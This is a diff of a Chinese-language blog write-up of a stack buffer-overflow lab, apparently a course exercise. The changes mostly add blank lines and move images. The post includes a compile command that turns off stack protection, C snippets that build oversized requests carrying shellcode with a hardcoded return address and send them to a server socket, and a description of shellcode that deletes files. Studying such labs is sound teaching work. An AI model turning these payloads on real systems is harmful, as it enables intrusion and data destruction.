@@ -10,6 +10,7 @@ excerpt: "Exercise 1：根据如下代码，打印出buffer数组的地址，其
 ---
 #Exercise 1：
 　　添加printf代码即可，注意地址需要用%p，编译并运行程序三次，可以得出三次地址各不相同。
+
 ```
 void badman()
 {
@@ -38,7 +39,10 @@ int main(int argc, char **argv)
   return 1;
 }
 ```
+
 使用如下命令输出结果
+
+
 ```
 ./stack1 >> address.txt
 ./stack1 >> address.txt
@@ -81,6 +85,7 @@ cat address.txt
 ![](http://i.imgur.com/AQ2GNAj.png)
 #Exercise6:
 　　实验过程如图所示，取得了控制权。
+
 ```
 gcc -g -z execstack -fno-stack-protector -o stack2 stack2.c
 代码：
@@ -140,6 +145,7 @@ int main(int argc, char**argv)
   return 1;
 }
 ```
+
 ![](http://i.imgur.com/Zvkqq1m.png)
 #Exercise7:
 　　找到两个漏洞，主要在以下代码中：
@@ -157,6 +163,7 @@ int main(int argc, char**argv)
 　　还有一个关键处是我们还要在数组最后加一个' ',这是getToken函数的出口之一，另一个是'\r\n'.
 
 　　将shellcode代码存入缓冲区，在最后一个字节填入' ',具体的代码如下：
+
 ```
 char req[1065];
   int i;
@@ -168,7 +175,9 @@ char req[1065];
   req[1064] = ' ';
   write(sock_client,req,1065);
 ```
+
 　2.根据找到的另一漏洞，我们可以不用shellcode，达到同样的效果，就是将fd的内容改为0，让read函数等待标准输入，代码如下：
+
 ```
 char req[1069];
   int i;
@@ -177,10 +186,12 @@ char req[1069];
   req[1068] = ' ';
   write(sock_client,req,1069);
 ```
+
 ![](http://i.imgur.com/CopUe1T.png)
 #Exercise9:
 
 　　先研究了create-shell.c文件中汇编指令之如何实现删除一个文件的，后来发现只需要把文件路径转化成十六进制的ascii码值，然后压栈，就可以完成删除工作，那么写了个小程序ascii.c把自己想要删除的文件路径转化成十六进制数据，然后写入create-shell.c文件中然后生成了shellcode，在放入test-shell.c文件中测试，发现成功啦！然后在写入shellcode进行攻击，终于攻击服务器成功了。
+
 ```
 ascii.c代码：
 int main()
@@ -222,12 +233,7 @@ __asm__(".globl mystart\n"
 	  "leave\n"
 	  "ret\n"
 	  );
-```  
-![](http://i.imgur.com/5s5cQa2.png)
-![](http://i.imgur.com/RwBFq2M.png)
-　　创建你的文件文件，运行./broswer程序之后，可以发现文件被成功删除。  
-
-```
+创建你的文件文件，运行./broswer程序之后，可以发现文件被成功删除。  
 char req[1065];
   long *ptr,*addr_ptr;
   addr_ptr = (long*)0xbffff9f8;
@@ -245,5 +251,8 @@ char req[1065];
   req[1064] = ' ';
   write(sock_client,req,1065);
 ```
+
+![](http://i.imgur.com/5s5cQa2.png)
+![](http://i.imgur.com/RwBFq2M.png)
 #Exercise10:
 　　s数组写入时检查i的大小是否小于1024，如果小于1024，则可以写入，否则不予写入。
